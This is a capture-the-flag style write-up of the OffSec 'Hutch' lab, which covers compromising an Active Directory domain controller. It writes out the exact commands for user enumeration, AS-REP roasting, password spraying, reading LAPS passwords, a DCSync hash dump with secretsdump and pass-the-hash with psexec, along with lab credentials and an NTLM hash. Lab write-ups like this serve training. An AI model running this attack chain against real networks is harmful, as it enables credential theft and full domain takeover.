Checking port 80 we have a default IIS page

Decided to run `enum4linux-ng` also for more enumeration


```bash
enum4linux-ng 192.168.214.122 -L -S -oJ hutch.json

# -L: Get additional info via LDAP/LDAPS
# -S: Get shares via RPC
# -oJ: Writes output to JSON file
```

Domain : hutch.offsec | 
DC : HUTCHDC


Enumerating users via `ldapsearch` we have few users


```bash
ldapsearch -x -H ldap://192.168.214.122 -b "DC=hutch,DC=offsec" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

opatry
ltaunton
acostello
jsparwell
oknee
jmckendry
avictoria
jfrarey

```



We can also confirm that this users are valid using the `kerbrute` tool


```bash
kerbrute userenum --dc 192.168.214.122 -d hutch.offsec users.txt
```

Performing an ASREPRoasting attack, unfortunately no user has pre-authentication enabled


```bash
GetNPUsers.py hutch.offsec/ -usersfile users.txt -format hashcat -dc-ip 192.168.214.122
```

Tried to password spray

- Using the SMB protocol

```bash
crackmapexec smb 192.168.214.122 -u users.txt -p users.txt
```


![](https://i.imgur.com/EVW8zBJ.png)


- Using the WINRM protocol

```bash
crackmapexec winrm 192.168.214.122 -u users.txt -p users.txt
```


![](https://i.imgur.com/7YGbvds.png)



However password spraying with an empty password we have this `STATUS_ACCOUNT_DISABLED` message on the guest account



![](https://i.imgur.com/9epKINu.png)


Still couldn't do anything cos we need the administrator password to enable any account, However it took me hours to figure out that some users leave passwords in description, so the below command using `ldapsearch` helped 



```bash
ldapsearch -x -H ldap://192.168.214.122 -b "DC=hutch,DC=offsec" -s sub "(&(objectclass=*))"  | grep description:
```


![](https://i.imgur.com/clUpkSP.png)



We found a password called `CrabSharkJellyfish192`, soooo i decided to password spray and we got a hit at user `fmcsorley`



```bash
netexec smb 192.168.214.122 -u users.txt -p "CrabSharkJellyfish192"
```



![](https://i.imgur.com/BHe29vS.png)


As my own **rule of thumb**, after valid creds i roll up `bloodhound-python` first to get more information on the domain


```bash
bloodhound-python -u 'fmcsorley' -p 'CrabSharkJellyfish192' -ns 192.168.214.122 -d hutch.offsec -c all
```



![](https://i.imgur.com/m6X2Wqr.png)



Also just so we don't miss anything let us check if this user has access to any shares


```bash
smbmap -H 192.168.214.122 -u fmcsorley -p CrabSharkJellyfish192
```



![](https://i.imgur.com/d4Dj05m.png)




However enumerating the shares i couldn't find anything valid so i  ran back to bloodhound, loaded my data and found out the user `fmcsorley` can read the **Local Administrator Password Solution** (LAPS) which **provides management of local account passwords of domain joined computers**.


![](https://i.imgur.com/Gg6lUsf.png)


To abuse this we can use the [pyLAPS](https://github.com/p0dalirius/pyLAPS) tool to retrieve credentials



```bash
./pyLAPS.py --action get -d "hutch.offsec" -u "fmcsorley" -p "CrabSharkJellyfish192" --dc-ip 192.168.214.122
```



![](https://i.imgur.com/jDxoPEq.png)


Now let see if this password works for the administrator user, hehe


```bash
netexec smb 192.168.198.122 -u administrator -p "{2[i2Nae6IjQDF" -d hutch.offsec
```


![](https://i.imgur.com/k3ALru1.png)


> I am so sorry the password above is different same as the IP, the lab got stopped and all things where rotated



We have a hit on the administrator and it looks like we are domain admin, we can still take a step further and perform the DCSync attack to replicate the DC and dump all users hash


```bash
secretsdump.py 'hutch.offsec'/'administrator'@192.168.198.122                
# Impacket v0.9.16-dev - Copyright 2002-2017 Core Security Technologies      
                                                                                                                                                                                             
# Password:
```



![](https://i.imgur.com/7Itac4o.png)


Then pass-the-hash for the admin user and get all flags


```bash
psexec.py administrator@192.168.198.122 -hashes aad3b435b51404eeaad3b435b51404ee:0ae9bb132b0b7c3722b7ba682d966e7a
```

## What did I learn ?


- First of, I need to start building a methodology for attacking AD, Point is, i missed the **"password in description"**, took me hours to figure it out and finally got it from a friend, this same thing also happened in **Dante**, THE LITTLE THINGS MATTER
- Secondly this lab was quite easy and straight forward BTW, cos' it is AD, hehe, soooo start learning **active directory penetration testing**!



Have fun 🤤
